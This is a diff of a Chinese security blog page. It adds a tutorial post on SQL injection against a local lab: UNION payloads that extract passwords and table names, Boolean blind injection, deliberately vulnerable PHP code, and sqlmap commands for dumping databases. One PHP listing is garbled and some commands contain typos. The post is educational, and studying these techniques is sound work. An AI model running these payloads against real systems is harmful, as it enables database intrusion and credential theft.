+<h4 id="order-by-判断字段数量"><a href="#order-by-判断字段数量" class="headerlink" title="order by 判断字段数量"></a>order by 判断字段数量</h4><p>我们已经得到该网站可能存在SQL注入漏洞的结论，接着使用order by 1-99语句查询该数据表的字段数量。如访问id=1 order by 3，页面返回与id=1相同的结果，访问id=4,页面返回与id不同的结果，则字符段为3.</p>
+<p>我们还可以使用order by 1,2,3，order by 1,2,3,4 返回不同的页面，则字符断为3.</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/order%20by%201%EF%BC%8C2%EF%BC%8C3.png" alt="order by 1,2,3"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/order%20by%201,2,3,4.png" alt="order by 1,2,3,4"></p>
+<h4 id="联合查询判断注入点"><a href="#联合查询判断注入点" class="headerlink" title="联合查询判断注入点"></a>联合查询判断注入点</h4><p>我们已经知道一共有三个字段，当id=1时，能够成功执行，则不会返回union select的语句，当id=-1时，服务器会返回union select的结果，可以看到，我们可以查询第二个字段和第三个字段。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/union.png" alt="union"></p>
+<p><strong>union查询也可以获得当前数据库</strong></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/union7.png" alt="union7"></p>
+<p><strong>获得当前数据库的第一个表名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1+union+select+1,(select+password+from+xiaoming.good+where+id&#x3D;1),3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/union8.png"></p>
+<p><strong>获取表名当中的字段名</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1+union+select+1,(select+column_name+from+information_schema.colimns+where+table_schema&#x3D;&#39;xiaoming&#39;+and+tablename&#x3D;&#39;good&#39;+limit+1,1),3</span><br></pre></td></tr></table></figure>
+
+<p><strong>查询第一个字段</strong></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/union9.png" alt="union9"></p>
+<p><strong>查询第二个字段</strong></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/union10.png" alt="union10"></p>
+<h3 id="Boolean注入攻击"><a href="#Boolean注入攻击" class="headerlink" title="Boolean注入攻击"></a>Boolean注入攻击</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">$server = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">$username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$passwd = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$dbname = <span class="string">&quot;xiaoming&quot;</span>;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($server,$username,$passwd,$dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error&lt;&gt;<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;Error&quot;</span>.$conn-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">column_name <span class="keyword">from</span> information_schema.columns where table_schema=<span class="string">&#x27;xiaoming&#x27;</span> <span class="keyword">and</span> table_name=<span class="string">&#x27;good&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">3</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string">if(preg_match(&quot;</span>/union|sleep|benchmark/i<span class="string">&quot;,<span class="subst">$id</span>))</span></span><br><span class="line"><span class="string">	&#123;exit(&quot;</span>no<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> <span class="subst">$data</span> = <span class="subst">$conn</span>-&gt;query(&quot;</span>select * <span class="keyword">from</span> good where id=<span class="string">&quot;.<span class="subst">$id</span>);</span></span><br><span class="line"><span class="string">  <span class="subst">$row</span>= <span class="subst">$data</span>-&gt;fetch_array(MYSQL_ASSOC);</span></span><br><span class="line"><span class="string"> if(<span class="subst">$row</span>)&#123;</span></span><br><span class="line"><span class="string"> 	exit(&quot;</span>yes<span class="string">&quot;);</span></span><br><span class="line"><span class="string"> &#125;else&#123;</span></span><br><span class="line"><span class="string"> exit(&quot;</span>no<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>分析代码可知，页面只返回yes和no，而没有返回数据库里面的数据，所有不能使用union注入。</p>
+<p>可以尝试Boolean注入。Boolean注入是指构造SQL判断语句，通过查看页面的返回结果来推测哪些SQL判断条件是成立的。</p>
+<p>访问id=1 and 1=2 返回no，访问id=1 and 1=1 返回yes，由此可以判断，可以尝试利用Boolean注入构造SQL判断语句，通过查看页面的返回结果来推测哪些SQL判断条件是成立的。</p>
+<h4 id="查询判断数据库的长度"><a href="#查询判断数据库的长度" class="headerlink" title="查询判断数据库的长度"></a><strong>查询判断数据库的长度</strong></h4><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/boolean2.png" alt="boolean2"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/boolean3.png" alt="boolean3"></p>
+<p>可知，数据库的长度为8。</p>
+<h4 id="利用substr判断数据库的库名"><a href="#利用substr判断数据库的库名" class="headerlink" title="利用substr判断数据库的库名"></a><strong>利用substr判断数据库的库名</strong></h4><p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/boolean4.png" alt="boolean4"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/boolean6.png" alt="boolean6"></p>
+<p>我们可以利用Burp爆破数据库中的库名，同理，我们也可以利用burp爆破数据库中的表名。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and ord(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;xiaoming&#39; limit 0,1),1,1))&#x3D;105</span><br></pre></td></tr></table></figure>
+
+<p>SQLMap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞。</p>
+<h3 id="sqlmap参数"><a href="#sqlmap参数" class="headerlink" title="sqlmap参数"></a>sqlmap参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">–is-dba 当前用户权限（是否为root权限）</span><br><span class="line">-db database</span><br><span class="line">–dbs 所有数据库</span><br><span class="line">–current-db 网站当前数据库</span><br><span class="line">–users 所有数据库用户</span><br><span class="line">–current-user 当前数据库用户</span><br><span class="line">–random-agent 构造随机user-agent</span><br><span class="line">–passwords 数据库密码</span><br><span class="line">–tables  -T 指定表名 </span><br><span class="line"> -D 列出指定数据库的表</span><br><span class="line">--columns 获取列</span><br><span class="line">--count 获取有几行数据 </span><br><span class="line">-C 读取数据（例如-C “username,password”）</span><br><span class="line">--dump 导出数据</span><br><span class="line">--level5：探测等级</span><br><span class="line">--roles：列出数据库管理员角色</span><br><span class="line">-sql-shell:运行自定义SQL语句</span><br><span class="line">-file-read:从数据库服务器中读取文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--referer:HTTP Referer头  (-r REQUESTFILE 从一个文件中载入HTTP请求。)</span><br><span class="line">SQL可以在请求中伪造HTTP的referer，当--level参数设定为3或者3以上时，会尝试对referer注入。可以使用referer命令来欺骗，如--referer http:&#x2F;&#x2F;www.baidu.com</span><br><span class="line"></span><br><span class="line">-p TESTPARAMETER 可注入的参数</span><br><span class="line">–proxy http:&#x2F;&#x2F;local:8080 –threads 10 (可以自定义线程加速) 代理</span><br><span class="line">–time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</span><br><span class="line"></span><br><span class="line">–data</span><br><span class="line">data后面的数据是以POST方式提交，sqlmap会像检测GET参数一样检测POST提交过去的参数</span><br><span class="line">sqlmap -u “http:&#x2F;&#x2F;192.168.120.249&#x2F;baji&#x2F;login.php” --data&#x3D;“username&#x3D;111111&amp;password&#x3D;111111”</span><br></pre></td></tr></table></figure>
+
+<h3 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h3><p><strong>利用下列代码进行演示</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">$server = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">$username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$passwd = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$dbname = <span class="string">&quot;xiaoming&quot;</span>;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($server,$username,$passwd,$dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error&lt;&gt;<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;Error&quot;</span>.$conn-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$data = $conn-&gt;query(<span class="string">&quot;select * from good where id=&quot;</span>.$id);</span><br><span class="line">$result= $data-&gt;fetch_array(MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> $result[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> $result[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/sqlmap1.png" alt="sqlmap1"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/sqlmap2.png" alt="sqlmap2"></p>
+<p>当注入点后面的参数大于等于两个时，需要加双引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sql1.php?id&#x3D;1&amp;uid&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<h4 id="判断文本当中的请求是否存在注入"><a href="#判断文本当中的请求是否存在注入" class="headerlink" title="判断文本当中的请求是否存在注入"></a>判断文本当中的请求是否存在注入</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /sql1.php?id=1 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: bilibili Security Browser</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
+
+<p>将该HTTP请求保存为1.txt</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/sqlmap3.png" alt="sqlmap3"></p>
+<h4 id="查询当前用户下的所有数据库"><a href="#查询当前用户下的所有数据库" class="headerlink" title="查询当前用户下的所有数据库"></a>查询当前用户下的所有数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sql1.php?id&#x3D;1 --dbs</span><br></pre></td></tr></table></figure>
+
+<h4 id="查询当前所在的数据库"><a href="#查询当前所在的数据库" class="headerlink" title="查询当前所在的数据库"></a>查询当前所在的数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql.php?id&#x3D;1&quot; --current-db</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/%E6%9A%B4%E5%BA%93.png" alt="暴库"></p>
+<h4 id="使用sqlmap查询当前数据库中的表名"><a href="#使用sqlmap查询当前数据库中的表名" class="headerlink" title="使用sqlmap查询当前数据库中的表名"></a>使用sqlmap查询当前数据库中的表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql.php?id&#x3D;1&quot; -D 当前数据库名 --tables </span><br></pre></td></tr></table></figure>
+
+<h4 id="获取表中的字段名"><a href="#获取表中的字段名" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql.php?id&#x3D;1&quot; -D 数据库名 -T 表名 --columns</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取字段内容"><a href="#获取字段内容" class="headerlink" title="获取字段内容"></a>获取字段内容</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql.php?id&#x3D;1&quot; -D 数据库名 -T 表名 -C 字段名，字段名 --dump</span><br></pre></td></tr></table></figure>
+
+<p><strong>为方便理解，在代码中加了换行。</strong></p>
+<p>发现只有当查询语句只返回一个字符串（值）才有正常的回显。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/union6.png" alt="union6"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1+union+select+1,(select+table_name+from+information_schema.tables+where+table_schema&#x3D;&#39;xiaoming&#39;+limit+0,1),3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/union8.png" alt="union8"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2020/10/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -763,7 +1147,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-count">15</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -816,12 +1200,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">76k</span>
+    <span title="站点总字数">91k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:09</span>
+    <span title="站点阅读时长">1:22</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
   </div>
